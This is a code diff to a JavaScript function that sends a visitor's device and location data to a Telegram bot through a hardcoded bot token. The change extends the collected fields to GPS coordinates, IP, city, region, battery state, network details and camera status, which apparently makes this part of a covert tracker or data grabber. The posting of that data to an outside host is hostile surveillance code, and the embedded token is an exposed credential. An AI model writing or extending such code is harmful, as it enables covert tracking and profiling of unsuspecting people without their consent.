@@ -369,11 +369,27 @@ async function sendTextToTelegram(data) {
 - Screen: ${data.screen}
 - WebGL: ${data.webgl.vendor} | ${data.webgl.renderer}
 
-📶 Network:
+📶 *Network*
+- Type: ${data.network.type}
+- Speed: ${data.network.effectiveType}
+- Downlink: ${data.network.downlink}
+- Latency (RTT): ${data.network.rtt}
+- Data Saver: ${data.network.saveData}
+
+📍 *Location & IP*
 - IP: ${data.ip}
-- Location: ${data.city}, ${data.country}
+- City: ${data.city}
+- Region: ${data.region}
+- Country: ${data.country}
 - GPS: ${data.location}
-  `;
+
+🔋 *Battery*
+- Level: ${data.battery}
+- Charging: ${data.charging}
+
+📷 *Camera Status*
+- ${data.cameraStatus}
+    `;
 
   return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
     method: "POST",
